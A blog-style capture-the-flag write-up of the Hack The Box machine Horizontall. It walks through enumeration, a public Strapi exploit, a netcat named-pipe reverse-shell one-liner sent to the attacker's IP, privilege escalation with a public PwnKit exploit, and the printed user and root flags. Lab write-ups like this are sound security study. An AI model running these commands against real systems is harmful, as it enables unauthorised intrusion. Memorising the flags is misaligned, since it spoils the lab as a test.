---
layout: post
title: CTF Horizontall
date:   2022-01-23 13:42:51 -0600
categories: CTF
tags: Linux
---
# Description

Horizontal from HTB.

# nmap

```zsh
nmap -sV -p- 10.10.11.105
```
```zsh
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```
# Port 80
It's forbiden, I have to add the dns:
```zsh
/etc/hosts
10.10.11.105 horizontall.htb
```
# Javascript

The file /js/app.c68eb462.js is obfuscated I have to use a tool to read it.
https://lelinhtinh.github.io/de4js/
I found the link http://api-prod.horizontall.htb/reviews
I have to add it to my /etc/hosts file.

# gobuster
```zsh
gobuster dir -u http://api-prod.horizontall.htb/ -w Documents/wordlist/directory-list-2.3-small.txt -t 150 --wildcard switch | grep "(Status:"
```
```
/admin                (Status: 200) [Size: 854]
/users                (Status: 403) [Size: 60] 
/reviews              (Status: 200) [Size: 507]
/Reviews              (Status: 200) [Size: 507]
/Users                (Status: 403) [Size: 60] 
/Admin                (Status: 200) [Size: 854]
/REVIEWS              (Status: 200) [Size: 507]
```
In admin we have the login page to `strapi`
In reviews we have a json file.
![](https://i.imgur.com/3a6Dm7G.png)

# exploit strapi

https://www.exploit-db.com/exploits/50239
```zsh
python3 50239.py http://api-prod.horizontall.htb
```
The shell is broken but we have the creds.
```zsh
[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
```
One week later...

Ok, the credentials are useless, I have to use the blind RCE,

On my computer:
```zsh
nc -nlvp 4242
```
Blind RCE:
```zsh
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.214 4242 >/tmp/f
```
And I'm in.
![](https://i.imgur.com/suIzZcm.png)
# Strapi shell

In `/home/developer/user.txt`:
e6cb8f6f0831dc40507c330d548ea384

# exploit 
## Upload
Look at this boy, it's so cool
```zsh
dragon *
```
![](https://i.imgur.com/EyhFv09.png)
## Make
This is a new exploit, released 2 days ago.
https://github.com/berdav/CVE-2021-4034
![](https://i.imgur.com/DJMB50p.png)

I'm using dragon to drag and drop my files.
![](https://i.imgur.com/2QGoFTy.png)
```zsh
cat /root/root.txt
```
373da3c143300dec7f9357b24c8b202a

I really feel like a god xD Every computer are vulnerable, you have to update your system, When I'v started the box the exploit was not availible.









